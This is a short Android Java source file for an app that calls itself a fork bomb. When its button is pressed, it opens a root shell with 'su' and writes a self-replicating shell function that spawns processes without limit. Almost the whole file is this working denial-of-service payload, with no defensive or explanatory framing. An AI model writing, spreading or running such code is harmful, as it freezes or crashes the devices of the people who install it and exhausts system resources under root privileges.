package com.blob.forkbomb;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.io.DataOutputStream;
import java.io.IOException;


public class MainActivity extends Activity {
    final static String[] commands = {
            "forkbomb(){ forkbomb | forkbomb & };",
            "forkbomb"
    };

   	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		Button b1 = (Button) findViewById(R.id.button1);

		b1.setOnClickListener(new View.OnClickListener() {
			public void onClick(View v) {
				Log.d("FORKBOMB", "forkbomb!");
				//NativeLib.fb();
                execCommands();
			}
		});
	}

    public Boolean execCommands() {
        try {
            Runtime rt = Runtime.getRuntime();
            Process process = rt.exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());

            for(int i = 0; i < commands.length; i++) {
                os.writeBytes(commands[i] + "\n");
                os.flush();
            }
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            Log.e("Log", "Exception: " + e);
            return false;
        } catch (InterruptedException e) {
            Log.e("Log", "Exception: " + e);
            return false;
        }
        return true;
    }
}
